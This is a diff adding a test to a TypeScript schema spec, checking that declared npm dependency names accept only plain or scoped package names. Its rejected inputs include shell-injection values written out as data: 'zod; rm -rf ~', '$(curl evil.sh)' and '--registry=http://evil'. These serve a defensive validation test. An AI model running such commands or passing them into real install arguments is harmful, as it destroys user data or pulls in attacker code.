@@ -21,6 +21,20 @@ describe("work order spec", () => {
     expect(result.success).toBe(false);
   });
 
+  it("accepts declared dependencies by npm name, plain or scoped, and only names", () => {
+    const parses = (name: string) => WorkOrderSpecSchema.safeParse({ ...validSpec(), dependencies: [{ name, dev: false }] }).success;
+
+    expect(parses("zod")).toBe(true);
+    expect(parses("@types/node")).toBe(true);
+    expect(parses("zod@4.0.0")).toBe(false);
+    expect(parses("zod; rm -rf ~")).toBe(false);
+    expect(parses("$(curl evil.sh)")).toBe(false);
+    expect(parses("--registry=http://evil")).toBe(false);
+    expect(parses("Zod")).toBe(false);
+    expect(WorkOrderSpecSchema.safeParse({ ...validSpec(), dependencies: [{ name: "zod" }] }).success).toBe(false);
+    expect(WorkOrderSpecSchema.safeParse(validSpec()).data).not.toHaveProperty("dependencies");
+  });
+
   it("rejects an unknown risk level", () => {
     expect(WorkOrderSpecSchema.safeParse({ ...validSpec(), risk: "huge" }).success).toBe(false);
   });
